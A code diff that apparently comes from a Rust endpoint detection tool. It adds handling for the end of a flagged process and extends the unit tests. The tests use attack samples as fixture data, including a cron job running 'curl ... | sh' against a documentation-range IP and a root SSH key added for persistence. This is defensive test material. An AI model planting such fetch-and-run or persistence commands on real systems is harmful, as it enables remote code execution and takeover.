@@ -1,4 +1,4 @@
-use zedr_protocol::{PersistenceEvent, ProcessAction, ProcessEvent, SensorEvent};
+use zedr_protocol::{InventoryAction, PersistenceEvent, ProcessAction, ProcessEvent, SensorEvent};
 use zedr_rules::{base_name, Opens, RuleId};
 
 use crate::hunt::kind_name;
@@ -10,6 +10,8 @@ pub const INCIDENT_PREFIX: &str = "detection.";
 pub enum Opened<'a> {
     Process { process: &'a ProcessEvent, parent: Option<&'a ProcessEvent>, subject: Option<String> },
     Item(&'a PersistenceEvent),
+    /// The end of a process that had a finding, and the event that process entered with
+    End { end: &'a ProcessEvent, process: &'a ProcessEvent },
 }
 
 fn entered(event: &SensorEvent) -> Option<&ProcessEvent> {
@@ -19,13 +21,23 @@ fn entered(event: &SensorEvent) -> Option<&ProcessEvent> {
     }
 }
 
+fn another_process(named: u32, opened: u32) -> String {
+    format!("The release names process {} and the opened event is process {}", named, opened)
+}
+
 /// Sorts the opened events of a release into the roles its rule read them in, and fails when they are not what that rule opens
 pub fn roles<'a>(rule: RuleId, pid: u32, trigger: &'a SensorEvent, context: &'a [SensorEvent]) -> Result<Opened<'a>, String> {
     let wrong_shape = || format!("The opened events are not what {} reads", rule.id());
     let entries: Vec<&ProcessEvent> = context.iter().map(entered).collect::<Option<_>>().ok_or_else(wrong_shape)?;
 
     let (process, parent, subject) = match (rule.opens(), trigger, entries.as_slice()) {
-        (Opens::Item, SensorEvent::Persistence(item), []) if pid == 0 => return Ok(Opened::Item(item)),
+        (Opens::Item, SensorEvent::Persistence(item), []) if pid == 0 && !matches!(item.action, InventoryAction::Removed) => return Ok(Opened::Item(item)),
+        (Opens::EndAndProcess, SensorEvent::Process(end), [process]) if matches!(end.action, ProcessAction::Terminate) => {
+            return match [end.pid, process.pid].into_iter().find(|opened| *opened != pid) {
+                Some(other) => Err(another_process(pid, other)),
+                None => Ok(Opened::End { end, process }),
+            };
+        }
         (Opens::ProcessAndParent, trigger, [] | [_]) => (entered(trigger).ok_or_else(wrong_shape)?, entries.first().copied(), None),
         (Opens::EventProcessAndParent, SensorEvent::Network(connection), [process] | [process, _]) if rule != RuleId::DropsExecutable && connection.pid == process.pid => {
             (*process, entries.get(1).copied(), Some(format!("{}:{}", connection.dest_ip, connection.dest_port)))
@@ -37,7 +49,7 @@ pub fn roles<'a>(rule: RuleId, pid: u32, trigger: &'a SensorEvent, context: &'a 
     };
 
     if process.pid != pid {
-        return Err(format!("The release names process {} and the opened event is process {}", pid, process.pid));
+        return Err(another_process(pid, process.pid));
     }
     if parent.is_some_and(|parent| parent.pid != process.ppid) {
         return Err(format!("The opened parent is not the parent of process {}", pid));
@@ -62,9 +74,10 @@ pub struct Finding {
 }
 
 impl Finding {
-    pub fn new(rule: RuleId, pid: u32, started_at: u64, opened: &Opened, trigger: u64, window: u64) -> Self {
+    /// The finding a release tells. None for the end of a process, which only follows up on a finding and is none of its own
+    pub fn new(rule: RuleId, pid: u32, started_at: u64, opened: &Opened, trigger: u64, window: u64) -> Option<Self> {
         match opened {
-            Opened::Process { process, parent, subject } => Finding {
+            Opened::Process { process, parent, subject } => Some(Finding {
                 rule,
                 technique: rule.technique(),
                 pid,
@@ -76,8 +89,8 @@ impl Finding {
                 autostart: None,
                 trigger,
                 window,
-            },
-            Opened::Item(item) => Finding {
+            }),
+            Opened::Item(item) => Some(Finding {
                 rule,
                 technique: rule.technique_for(item.kind),
                 pid,
@@ -89,7 +102,8 @@ impl Finding {
                 autostart: Some(kind_name(item.kind)),
                 trigger,
                 window,
-            },
+            }),
+            Opened::End { .. } => None,
         }
     }
 
@@ -120,7 +134,8 @@ impl Finding {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use zedr_protocol::{FileAction, FileEvent, InventoryAction, NetworkAction, NetworkEvent, PersistenceKind};
+    use zedr_protocol::{FileAction, FileEvent, NetworkAction, NetworkEvent, PersistenceKind};
+    use zedr_rules::Level;
 
     fn run(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> SensorEvent {
         let mut command_line = vec![path.to_string()];
@@ -152,11 +167,11 @@ mod tests {
         SensorEvent::File(FileEvent { timestamp, path: path.to_string(), action: FileAction::Write, pid, process_path: String::new(), hash: None })
     }
 
-    fn autostart(kind: PersistenceKind, name: &str, path: &str, command: &str) -> SensorEvent {
-        SensorEvent::Persistence(PersistenceEvent { timestamp: 500, action: InventoryAction::Added, kind, name: name.to_string(), path: path.to_string(), command: command.to_string(), user: "root".to_string(), enabled: true, hash: None })
+    fn autostart(action: InventoryAction, kind: PersistenceKind, name: &str, path: &str, command: &str) -> SensorEvent {
+        SensorEvent::Persistence(PersistenceEvent { timestamp: 500, action, kind, name: name.to_string(), path: path.to_string(), command: command.to_string(), user: "root".to_string(), enabled: true, hash: None })
     }
 
-    fn finding(rule: RuleId, pid: u32, started_at: u64, trigger: &SensorEvent, context: &[SensorEvent]) -> Result<Finding, String> {
+    fn finding(rule: RuleId, pid: u32, started_at: u64, trigger: &SensorEvent, context: &[SensorEvent]) -> Result<Option<Finding>, String> {
         roles(rule, pid, trigger, context).map(|opened| Finding::new(rule, pid, started_at, &opened, 7, 3))
     }
 
@@ -164,7 +179,7 @@ mod tests {
     fn test_a_process_finding_is_told_from_the_process_and_its_parent() {
         let nginx = run(1, 20, 0, "/usr/sbin/NGINX", &[]);
         let shell = run(2, 21, 20, "/bin/sh", &["-c", "id"]);
-        let found = finding(RuleId::ServerChild, 21, 2, &shell, std::slice::from_ref(&nginx)).unwrap();
+        let found = finding(RuleId::ServerChild, 21, 2, &shell, std::slice::from_ref(&nginx)).unwrap().unwrap();
         assert_eq!(found.incident_type(), "detection.server-child");
         assert_eq!(
             found.evidence(),
@@ -174,7 +189,7 @@ mod tests {
             })
         );
 
-        let orphan = finding(RuleId::WritableImage, 30, 9, &run(9, 30, 0, "/tmp/.x/kworker", &[]), &[]).unwrap();
+        let orphan = finding(RuleId::WritableImage, 30, 9, &run(9, 30, 0, "/tmp/.x/kworker", &[]), &[]).unwrap().unwrap();
         assert_eq!((orphan.parent, orphan.subject), (None, None));
     }
 
@@ -182,34 +197,36 @@ mod tests {
     fn test_a_connection_or_file_finding_names_what_the_process_touched() {
         let office = run(1, 10, 0, "C:\\Office\\WINWORD.EXE", &[]);
         let shell = run(2, 11, 10, "C:\\Windows\\System32\\cmd.exe", &["/c", "x"]);
-        let reached = finding(RuleId::ShellNetwork, 11, 2, &connect(3, 11), &[shell.clone(), office.clone()]).unwrap();
+        let reached = finding(RuleId::ShellNetwork, 11, 2, &connect(3, 11), &[shell.clone(), office.clone()]).unwrap().unwrap();
         assert_eq!(reached.evidence()["subject"], "203.0.113.9:443");
         assert_eq!(reached.evidence()["level"], "medium");
         assert_eq!(reached.evidence()["parent"], "winword.exe");
         assert!(reached.image.ends_with("cmd.exe") && reached.command.ends_with("/c x"));
 
-        let dropped = finding(RuleId::DropsExecutable, 11, 2, &write(4, 11, "C:\\Users\\Public\\update.dll"), std::slice::from_ref(&shell)).unwrap();
+        let dropped = finding(RuleId::DropsExecutable, 11, 2, &write(4, 11, "C:\\Users\\Public\\update.dll"), std::slice::from_ref(&shell)).unwrap().unwrap();
         assert_eq!(dropped.subject.as_deref(), Some("C:\\Users\\Public\\update.dll"));
         assert_eq!(dropped.parent, None);
     }
 
     #[test]
     fn test_an_autostart_finding_takes_its_technique_from_the_kind_of_item() {
-        let planted = autostart(PersistenceKind::Cron, "sysupdate", "/etc/cron.d/sysupdate", "curl -fsS http://203.0.113.47/u | sh");
-        let found = finding(RuleId::AutostartFetch, 0, 500, &planted, &[]).unwrap();
+        let planted = autostart(InventoryAction::Added, PersistenceKind::Cron, "sysupdate", "/etc/cron.d/sysupdate", "curl -fsS http://203.0.113.47/u | sh");
+        let found = finding(RuleId::AutostartFetch, 0, 500, &planted, &[]).unwrap().unwrap();
         let evidence = found.evidence();
         assert_eq!(evidence["technique"], "T1053.003");
         assert_eq!(evidence["autostart"], "cron");
         assert_eq!(evidence["subject"], "sysupdate");
         assert_eq!(evidence["image"], "/etc/cron.d/sysupdate");
-        assert_eq!(finding(RuleId::RootKeyAdded, 0, 500, &autostart(PersistenceKind::AuthorizedKey, "root@build", "/root/.ssh/authorized_keys", "ssh-ed25519"), &[]).unwrap().technique, "T1098.004");
+        let key = autostart(InventoryAction::Added, PersistenceKind::AuthorizedKey, "root@build", "/root/.ssh/authorized_keys", "ssh-ed25519");
+        assert_eq!(finding(RuleId::RootKeyAdded, 0, 500, &key, &[]).unwrap().unwrap().technique, "T1098.004");
     }
 
     #[test]
     fn test_events_that_are_not_what_the_rule_opens_are_refused() {
         let nginx = run(1, 20, 0, "/usr/sbin/nginx", &[]);
         let shell = run(2, 21, 20, "/bin/sh", &["-c", "id"]);
-        let item = autostart(PersistenceKind::Cron, "a", "/etc/cron.d/a", "curl http://x | sh");
+        let item = autostart(InventoryAction::Added, PersistenceKind::Cron, "a", "/etc/cron.d/a", "curl http://x | sh");
+        let gone = autostart(InventoryAction::Removed, PersistenceKind::Cron, "a", "/etc/cron.d/a", "curl http://x | sh");
         let refused = [
             finding(RuleId::ServerChild, 21, 2, &connect(3, 21), std::slice::from_ref(&nginx)),
             finding(RuleId::ServerChild, 21, 2, &shell, &[nginx.clone(), nginx.clone()]),
@@ -222,6 +239,7 @@ mod tests {
             finding(RuleId::AutostartFetch, 0, 500, &item, std::slice::from_ref(&shell)),
             finding(RuleId::AutostartFetch, 0, 500, &shell, &[]),
             finding(RuleId::PreloadAdded, 4, 500, &item, &[]),
+            finding(RuleId::AutostartFetch, 0, 500, &gone, &[]),
         ];
         for (case, result) in refused.iter().enumerate() {
             assert!(result.as_ref().is_err_and(|error| error.contains("not what")), "case {} gave {:?}", case, result);
@@ -236,5 +254,38 @@ mod tests {
         assert!(finding(RuleId::ShellNetwork, 21, 2, &connect(3, 22), std::slice::from_ref(&shell)).is_err(), "a connection of another process");
         let stranger = run(1, 99, 0, "/usr/sbin/nginx", &[]);
         assert!(finding(RuleId::ServerChild, 21, 2, &shell, &[stranger]).unwrap_err().contains("not the parent"));
+    }
+
+    #[test]
+    fn test_the_end_of_a_flagged_process_is_read_with_the_event_it_entered_with_and_is_no_finding() {
+        let shell = run(2, 21, 20, "/bin/sh", &["-c", "id"]);
+        let ended = end(9, 21);
+        let opened = roles(RuleId::FlaggedProcessEnded, 21, &ended, std::slice::from_ref(&shell)).unwrap();
+        assert!(matches!(opened, Opened::End { end, process } if end.timestamp == 9 && process.timestamp == 2));
+        assert_eq!(Finding::new(RuleId::FlaggedProcessEnded, 21, 2, &opened, 7, 3), None);
+
+        let (connection, twice, ended_before) = (connect(9, 21), [shell.clone(), shell.clone()], [end(8, 21)]);
+        let refused = [
+            roles(RuleId::FlaggedProcessEnded, 21, &shell, std::slice::from_ref(&shell)),
+            roles(RuleId::FlaggedProcessEnded, 21, &connection, std::slice::from_ref(&shell)),
+            roles(RuleId::FlaggedProcessEnded, 21, &ended, &[]),
+            roles(RuleId::FlaggedProcessEnded, 21, &ended, &twice),
+            roles(RuleId::FlaggedProcessEnded, 21, &ended, &ended_before),
+        ];
+        for (case, result) in refused.iter().enumerate() {
+            assert!(result.as_ref().is_err_and(|error| error.contains("not what")), "case {} gave {:?}", case, result);
+        }
+
+        let (other_end, other_entry) = (end(9, 22), [run(2, 23, 20, "/bin/sh", &[])]);
+        assert!(roles(RuleId::FlaggedProcessEnded, 22, &ended, std::slice::from_ref(&shell)).unwrap_err().contains("names process 22"));
+        assert!(roles(RuleId::FlaggedProcessEnded, 21, &other_end, std::slice::from_ref(&shell)).unwrap_err().contains("is process 22"), "the end of another process");
+        assert!(roles(RuleId::FlaggedProcessEnded, 21, &ended, &other_entry).unwrap_err().contains("is process 23"), "the entry of another process");
+    }
+
+    #[test]
+    fn test_the_rules_that_are_no_finding_are_the_ones_that_open_the_end_of_a_process() {
+        for rule in RuleId::ALL {
+            assert_eq!(rule.level() == Level::Info, rule.opens() == Opens::EndAndProcess, "{}: what the opened events are decides whether there is a finding", rule.id());
+        }
     }
 }
